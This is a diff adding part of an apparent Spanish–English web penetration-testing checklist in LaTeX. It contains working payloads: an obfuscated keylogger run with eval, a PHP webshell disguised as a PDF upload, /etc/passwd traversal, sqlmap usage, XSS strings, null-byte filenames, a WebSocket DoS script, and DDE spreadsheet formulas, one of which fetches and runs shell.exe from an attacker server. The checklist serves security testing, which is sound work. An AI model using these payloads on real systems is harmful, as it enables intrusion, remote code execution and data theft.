+    "<iframe width='100%' height='100%' src='data:text/html;base64, " + encodeURI(b64code) + "'></iframe>"
+);
+\end{verbatim}
+
+\paragraph{Keylogger with Javascript Client Side Browser Test
+PoC}\label{keylogger-with-javascript-client-side-browser-test-poc}
+
+\begin{verbatim}
+var b64code =  "Ly8gU2VydmVyIEluZm9ybWF0aW9uCnZhciByaG9zdCA9ICcxMjcuMC4wLjEnOwp2YXIgcnBvcnQgPSA4MDsKdmFyIHJwYXRoID0gJy9sb2dnZXInOwoKLy9jb25zdCB3cyA9IG5ldyBXZWJTb2NrZXQoYHdzOi8vJHtyaG9zdH06JHtycG9ydH0ke3JwYXRofWApOwoKLy93cy5vbm1lc3NhZ2UgPSAobXNnKSA9PiB7Ci8vICAgIAovLwlpZiAobXNnLmRhdGEgIT0gIm9rIikgewovLwkJY29uc29sZS5sb2coIkludGVybmFsIFNlcnZlciBFcnJvciIpOwovLwl9Ci8vfQoKLy8gUG9DIHNlZSB0ZXh0CmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gIjxzcGFuPjxoMyBzdHlsZT0nYWxsOiB1bnNldDtmb250LXN0eWxlOiBvYmxpcXVlJz48Yj5EYXRvcyBlbnZpYWRvcyBhIHNlcnZpZG9yIHJlbW90bzo8L2I+PC9oMz48L3NwYW4+PGhyPjxkaXYgaWQ9J2tsLWNvbnRhaW5lcicgc3R5bGU9J2FsbDogaW5pdGlhbCc+PC9kaXY+IiArIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MOwoKd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCBrZXkgPT4gewoKICAgIC8vd3Muc2VuZChrZXkua2V5Q29kZSk7CiAgICAvL2NvbnNvbGUubG9nKGtleS5rZXlDb2RlKTsKCiAgICB2YXIga2V5Q29kZSA9IGtleS5rZXlDb2RlOwogICAgdmFyIGNockNvZGUgPSAoOTYgPD0ga2V5Q29kZSAmJiBrZXlDb2RlIDw9IDEwNSkgPyBrZXlDb2RlIC0gNDggOiBrZXlDb2RlCiAgICB2YXIgdGV4dDsKCiAgICBpZiAoa2V5Q29kZSA9PSAxNikgewogICAgICAgIHRleHQgPSAiJmx0O01BWVVTQyAiICsga2V5Q29kZSArICImZ3Q7IjsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgna2wtY29udGFpbmVyJykuaW5uZXJIVE1MICs9IHRleHQ7CiAgICB9IGVsc2UgaWYgKGtleUNvZGUgPD0gOTYgJiYga2V5Q29kZSA+PSA2NSkgewogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdrbC1jb250YWluZXInKS5pbm5lckhUTUwgKz0gU3RyaW5nLmZyb21DaGFyQ29kZShrZXlDb2RlKTsKICAgIH0gZWxzZSB7CiAgICAgICAgdGV4dCA9ICImbHQ7IiArIGtleUNvZGUgKyAiJmd0OyI7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2tsLWNvbnRhaW5lcicpLmlubmVySFRNTCArPSB0ZXh0OwoKICAgIH0KCgp9KTs="
+\end{verbatim}
+
+\begin{verbatim}
+eval(atob(b64code));
+\end{verbatim}
+
+\subsection{Configuration Management}\label{configuration-management}
+
+\paragraph{Search for default configurations
+test}\label{search-for-default-configurations-test}
+
+Search for routes that doesn’t exist.
+
+\url{https://url/donotexist}
+
+\paragraph{Search for technology on headers
+response}\label{search-for-technology-on-headers-response}
+
+\begin{itemize}
+\tightlist
+\item
+  Apache
+\item
+  CentOS
+\item
+  Open Source Applications
+\end{itemize}
+
+\subsection{Error Handling}\label{error-handling}
+
+\paragraph{URL overflow}\label{url-overflow}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\KeywordTok{..........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................}\StringTok{/etc/}\NormalTok{passwd}
+\end{Highlighting}
+\end{Shaded}
+
+\paragraph{Not found resource}\label{not-found-resource}
+
+\begin{verbatim}
+/url/donotexist
+\end{verbatim}
+
+\paragraph{Not permision to resource}\label{not-permision-to-resource}
+
+\begin{verbatim}
+sudo apt-get install sqlmap
+sqlmap -u <http://testphp.vulnweb.com/listproducts.php?cat=1> -D acuart --tables
+\end{verbatim}
+
+\textbackslash\%20 white space
+
+\begin{verbatim}
+/%20%2A%2A%2A%20Por%20favor%20redirigete%20a%20la%20siguiente%20%20direccion%20%20(copia%20%20y%20%20pega):%7F___%20www.sitiomalo.com%20___%20%2A%2A%2A%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%7F%20%20%20%20Ignore%20the%20error%20
+\end{verbatim}
+
+\begin{verbatim}
+_________***Por_favor_redirigete_a_la_siguiente_direccion_(copia_y_pega):___www.sitiomalo.com___***
+\end{verbatim}
+
+\paragraph{Bad request}\label{bad-request}
+
+\begin{verbatim}
+/%20%20%
+\end{verbatim}
+
+\subsection{Buffer overflow}\label{buffer-overflow}
+
+\paragraph{Heap Overflows Test
+(OWASP-BO-002)}\label{heap-overflows-test-owasp-bo-002}
+
+Ensure that the application is not susceptible to any heap overflows.
+
+\paragraph{Stack Overflows Test
+(OWASP-BO-003)}\label{stack-overflows-test-owasp-bo-003}
+
+Ensure that the application is not susceptible to any stack overflows.
+
+\paragraph{Format Strings Test
+(OWASP-BO-004)}\label{format-strings-test-owasp-bo-004}
+
+Ensure that the application is not susceptible to any format string
+
+\subsection{Feature : File upload - Test Upload of Malicious Files
+(OTG-BUSLOGIC-009)}\label{feature-file-upload---test-upload-of-malicious-files-otg-buslogic-009}
+
+\paragraph{Summary}\label{summary}
+
+Many application’s business processes allow for the upload of
+data/information. We regularly check the validity and security of text
+but accepting files can introduce even more risk. To reduce the risk we
+may only accept certain file extensions, but attackers are able to
+encapsulate malicious code into inert file types. Testing for malicious
+files verifies that the application/system is able to correctly protect
+against attackers uploading malicious files
+
+\paragraph{Example}\label{example}
+
+Suppose a picture sharing application allows users to upload their .gif
+or .jpg graphic files to the web site. What if an attacker is able to
+upload a PHP shell, or exe file, or virus? The attacker may then upload
+the file that may be saved on the system and the virus may spread itself
+or through remote processes exes or shell code can be executed.
+
+\paragraph{Test}\label{test}
+
+\textbf{Generic Testing Method}
+
+\begin{itemize}
+\tightlist
+\item
+  Review the project documentation and use exploratory testing looking
+  at the application/system to identify what constitutes and “malicious”
+  file in your environment.
+\item
+  Develop or acquire a known “malicious” file.
+\item
+  Try to upload the malicious file to the application/system and verify
+  that it is correctly rejected.
+\item
+  If multiple files can be uploaded at once, there must be tests in
+  place to verify that each file is properly evaluated.
+\end{itemize}
+
+\textbf{Specific Testing Method 1}
+
+\begin{itemize}
+\tightlist
+\item
+  Using the Metasploit payload generation functionality generates a
+  shellcode as a Windows executable using the Metasploit “msfpayload”
+  command.
+\item
+  Submit the executable via the application’s upload functionality and
+  see if it is accepted or properly rejected.
+\end{itemize}
+
+\textbf{Specific Testing Method 2}
+
+\begin{itemize}
+\tightlist
+\item
+  Develop or create a file that should fail the application malware
+  detection process. There are many available on the Internet such as
+  ducklin.htm or ducklin-html.htm.
+\item
+  Submit the executable via the application’s upload functionality and
+  see if it is accepted or properly rejected.
+\end{itemize}
+
+\textbf{Specific Testing Method 3}
+
+\begin{itemize}
+\tightlist
+\item
+  Set up the intercepting proxy to capture the “valid” request for an
+  accepted file.
+\item
+  Send an “invalid” request through with a valid/acceptable file
+  extension and see if the request is accepted or properly rejected.
+\end{itemize}
+
+Example of Content Type for request:
+
+\begin{verbatim}
+Content-Disposition: form-data; name="file"; filename="documento.php"
+Content-Type: application/pdf
+
+text/x-php
+\end{verbatim}
+
+Example of Webshell content:
+
+\begin{verbatim}
+Content-Disposition: form-data; name="file"; filename="smtW3sGGkAyx0YHhV689GsTHkqMaKeIdGXycIgHX1.pdf.pdf.html"
+Content-Type: application/pdf
+
+%PDF-1.4
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<p>This is an example of webshell to execute commands in remote server:</p>
+<pre>
+<?php
+   if(isset($_GET['cmd']))
+   {
+       system($_GET['cmd']);
+
+?>
+<script>javacript:alert('XSS PAYLOAD')</script>
+</pre>
+</body>
+</html>
+%%EOF
+\end{verbatim}
+
+Other example of webshell:
+
+\begin{verbatim}
+Content-Disposition: form-data; name="file"; filename="smtW3sGGkAyx0YHhV689GsTHkqMaKeIdGXycIgHX1.pdf.pdf.exe"
+Content-Type: application/pdf
+
+%PDF-1.4
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<p>This is an example of webshell to execute commands in remote server:</p>
+<pre>
+<?php
+   if(isset($_GET['cmd']))
+   {
+       system($_GET['cmd']);
+
+?>
+<script>javacript:alert('XSS PAYLOAD')</script>
+</pre>
+</body>
+%%EOF
+\end{verbatim}
+
+Test input.
+
+\begin{verbatim}
+<script>javascript:alert("Hacked pronto seras redireccionado...")</script>
+
+href
+javascript:alert("Hacked pronto seras redireccionado, ten buen día...")
+\end{verbatim}
+
+MimeTypes to render.
+
+\begin{verbatim}
+
+Content-Type: application/x-php
+
+text/x-php
+text/html
+text/plain
+text/x-php
+application/x-php
+application/x-httpd-php
+application/x-httpd-php-source
+\end{verbatim}
+
+Other useful extensions:
+
+\begin{itemize}
+\tightlist
+\item
+  PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps,
+  .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
+\item
+  ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml,
+  .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+\item
+  JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion:
+  .cfm, .cfml, .cfc, .dbm
+\item
+  Flash: .swf
+\item
+  Perl: .pl, .cgi
+\end{itemize}
+
+File extensiones to check:
+
+\begin{itemize}
+\tightlist
+\item
+  nombre\_archivo.php\%0d\%0a.pdf
+\item
+  nombre\_archivo.php\%0d\%0a.xslx
+\item
+  nombre\_archivo.html\%0d\%0a.pdf
+\item
+  shell.php\%00.pdf
+\item
+  shell.php\x00.pdf
+\item
+  archivo.html\x00.pdf
+\item
+  archivo.php\%00.xlsx
+\item
+  archivo.php\x00.xlsx
+\end{itemize}
+
+\paragraph{Tools}\label{tools}
+
+\begin{itemize}
+\tightlist
+\item
+  Metasploit’s payload generation functionality
+\item
+  Intercepting proxy
+\item
+  \href{https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf}{Download
+  Dummy PDF}
+\item
+  \href{https://png.pngitem.com/pimgs/s/185-1850003_sample-png-transparent-png.png}{Dummy
+  PNG file from browser}
+\item
+  \href{https://download.apkpure.com/custom/com.apkpure.aegon-3184461.apk?_fn=QVBLUHVyZV92My4xOC40NF9hcGtwdXJlLmNvbS5hcGs&as=41277ba0fd5b210b38364d700a9c2f5863768db1&ai=1515868332&at=1668713785&_sa=ai\%2Cat&k=1990fbed7d83791b74d5073a8bdf471b63793039&r=https\%3A\%2F\%2Fm.apkpure.com\%2Fes\%2Fhelloworld\%2Fmy.v1rtyoz.helloworld&_p=Y29tLmFwa3B1cmUuYWVnb24&c=1\%7CTOOLS\%7CZGV2PUFQS1B1cmUmdD1hcGsmcz0xMjMyNDE1OCZ2bj0zLjE4LjQ0JnZjPTMxODQ0NjE&hot=1&arg=apkpure\%3A\%2F\%2Fcampaign\%2F\%3Futm_medium\%3Dapkpure\%26utm_source\%3Ddetail-m\%26report_context\%3D\%7B\%22id\%22\%3A\%221072087846\%22\%2C\%22channel_id\%22\%3A\%221009\%22\%7D}{HelloWorld
+  APK}
+\item
+  Web Shells
+  Repository\url{https://github.com/TheBinitGhimire/Web-Shells}
+\end{itemize}
+
+\paragraph{References}\label{references}
+
+\textbf{Whitepapers:}
+
+\begin{itemize}
+\tightlist
+\item
+  Saumil Shah: “An Introduction to HTTP fingerprinting”
+  -\url{http://www.net-square.com/httprint_paper.html}
+\item
+  Anant Shrivastava: “Web Application Finger Printing” - http://
+  \href{http://anantshri.info/articles/web_app_finger_printing.html}{anantshri.info/articles/web\_app\_finger\_printing.html}
+\end{itemize}
+
+\textbf{Related websites:}
+
+\begin{itemize}
+\tightlist
+\item
+  OWASP - Unrestricted File Upload
+  -\url{https://www.owasp.org/index.php/Unrestricted_File_Upload}
+\item
+  Why File Upload Forms are a Major Security Threat -
+  http:/www.acunetix.com/websitesecurity/upload-forms-threat/
+\item
+  File upload security best practices: Block a malicious file
+  upload\url{http://www.computerweekly.com/answer/File-uploadsecurity-best-practices-Block-a-malicious-file-upload}
+\item
+  Overview of Malicious File Upload Attacks
+  http:/securitymecca.com/article/overview-of-malicious-fileupload-attacks/
+\item
+  Stop people uploading malicious PHP files via
+  forms\url{http://stackoverflow.com/questions/602539/stop-peopleuploading-malicious-php-files-via-forms}
+\item
+  How to Tell if a File is
+  Malicious\url{http://www.techsupportalert.com/content/how-tell-if-filemalicious.htm}
+\item
+  CWE-434: Unrestricted Upload of File with Dangerous
+  Type\url{http://cwe.mitre.org/data/definitions/434.html}
+\item
+  Implementing Secure File
+  Upload\url{http://infosecauditor.wordpress.com/tag/malicious-fileupload/}
+\item
+  Watchful File
+  Upload\url{http://palizine.plynt.com/issues/2011Apr/file-upload/}
+\item
+  Matasploit Generating
+  Payloads\url{http://www.offensive-security.com/metasploit-unleashed/}
+  Generating\_Payloads
+\item
+  Project Shellcode – Shellcode Tutorial 9: Generating Shellcode Using
+  Metasploit\url{http://www.projectshellcode}. com/?q=node/29
+\item
+  Anti-Malware Test file -\url{http://www.eicar.org/86-0-Intended}
+  use.html
+\end{itemize}
+
+\paragraph{Remediation}\label{remediation}
+
+While safeguards such as black or white listing of file extensions,
+using “Content-Type” from the header, or using a file type recognizer
+may not always be protections against this type of vulnerability. Every
+application that accepts files from users must have a mechanism to
+verify that the uploaded file does not contain malicious code. Uploaded
+files should never be stored where the users or attackers can directly
+access them
+
+\section{Application DOS}\label{application-dos}
+
+\paragraph{Delete important records
+test}\label{delete-important-records-test}
+
+Burps Suite repeater.
+
+\paragraph{Delete all possible data}\label{delete-all-possible-data}
+
+Burps Suite repeater.
+
+\paragraph{WebSocket Denial of Service
+Test}\label{websocket-denial-of-service-test}
+
+\begin{verbatim}
+const WebSocket = require('ws');
+const net = require('net');
+const wss = new WebSocket.Server({ port: 3000 }, function () {
+  const payload = 'constructor';  // or ',;constructor'
+const request = [
+'GET / HTTP/1.1',
+'Connection: Upgrade',
+'Sec-WebSocket-Key: test',
+'Sec-WebSocket-Version: 8',
+`Sec-WebSocket-Extensions: ${payload}`,
+'Upgrade: websocket',
+'\\\\r\\\\n'
+  ].join('\\\\r\\\\n');
+const socket = net.connect(3000, function () {
+socket.resume();
+socket.write(request);
+  });
+});
+\end{verbatim}
+
+\subsection{Feature : File upload - Webshell image with injected
+code}\label{feature-file-upload---webshell-image-with-injected-code}
+
+xss2png
+
+\begin{verbatim}
+git clone <https://github.com/vavkamil/xss2png.git>
+\end{verbatim}
+
+\begin{verbatim}
+python3 xss2png.py -p "<SCRIPT>alert(12345678)</SCRIPT>" -o xss.png
+\end{verbatim}
+
+\subsection{Feature: Excel reporte
+generation}\label{feature-excel-reporte-generation}
+
+\begin{verbatim}
+=@cmd|'/C cmd /k echo YOU ARE HACKED...'!'A1'
+=cmd|'/C calc'!A0
+DDE ("cmd";"/C calc";"!A0")A0
+@SUM(1+9)*cmd|' /C calc'!A0
+=10+20+cmd|' /C calc'!A0
+=cmd|' /C notepad'!'A1'
+=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+=cmd|'/c rundll32.exe \\\\\\\\10.0.0.1\\\\3\\\\2\\\\1.dll,0'!_xlbgnm.A1.
+\end{verbatim}
+
+\begin{verbatim}
+=HIPERVINCULO("<http://www.sitiomalo.com>","Nombre Usuario")
+
+=HIPERVINCULO("file:///C:/Users/usuario/Desktop/dummy.pdf","Nombre Usuario")
+\end{verbatim}
+
+\subsection{Feature: Email send}\label{feature-email-send}
+
+Check iteration limit protection for email bombing.
+
+\subsection{Feature: User CRUD}\label{feature-user-crud}
+
+Check iteration limit protection for email bombing.
+
+\subsubsection{Feature: Modify user}\label{feature-modify-user}
+
+Privilege escalation.
+
+\subsection{Cross-Origin Resource Sharing
+(CORS)}\label{cross-origin-resource-sharing-cors}
+
+Ensuring that your services and resources are only accessed by trusted
+domains is another easy way to minimize potential exploits. Creating a
+CORS policy allows your applications to figure out what traffic to block
+and which to let in, depending on where it originates from.
+
+Proper CORS headers can allow or deny access from other domains to
+resources. This helps to prevent cross-site request forgery and
+cross-site scripting attacks. By properly configuring CORS headers, you
+can restrict access to your web application’s resources to trusted
+domains and reduce the risk of these types of attacks.
+
+Many frameworks will have CORS functionality built directly into them so
+it is available out-of-the-box and extremely easy to configure. For
+example, in Spring Boot we can set up a CORS policy like this:
+
+\begin{verbatim}
+@Configuration
+public class WebConfig implements WebMvcConfigurer {
+   @Override
+   public void addCorsMappings(CorsRegistry registry) {
+       registry.addMapping("/**")
+               .allowedOrigins("https://example.com")
+               .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
+               .allowedHeaders("*")
+               .allowCredentials(true)
+               .maxAge(3600);
+   }
+}
+\end{verbatim}
+
+This example configuration stipulates the following:~
+
+\begin{itemize}
+\item
+  Allows all resources to be accessed
+  from~\textbf{https://example.com}~using any of the HTTP
+  methods~\textbf{GET},~\textbf{POST},~\textbf{PUT},~\textbf{DELETE},
+  and~\textbf{OPTIONS}.~
+\item
+  The~*****~value for allowed headers means that any header is allowed
+  in the request.~
+\item
+  The~\textbf{allowCredentials}~setting is set to~\textbf{true},
+  allowing credentials to be sent in the request.~
+\item
+  The~\textbf{maxAge}~value of~\textbf{3600}~indicates that the
+  preflight response can be cached for up to one hour.
+\end{itemize}
+
+Using even a simple configuration like the one above can add a massive
+amount of security to your application. As mentioned, many other
+frameworks have similar configuration options available.
+
+\subsection{Glossary}\label{glossary}
+
+Descripción de la evidencia:
+
+Como se puede observar en la imagen de evidencia, es posible que el
+aplicativo este aceptando la carga de archivos relacionados a Webshells
+de Apache. Se ha reconocido el uso de la tecnología Apache, por lo que
+se recomienda revisar más a detalle este posible riesgo.
+
+\subsubsection{Downlado code analizar extarc
+URLS}\label{downlado-code-analizar-extarc-urls}
+
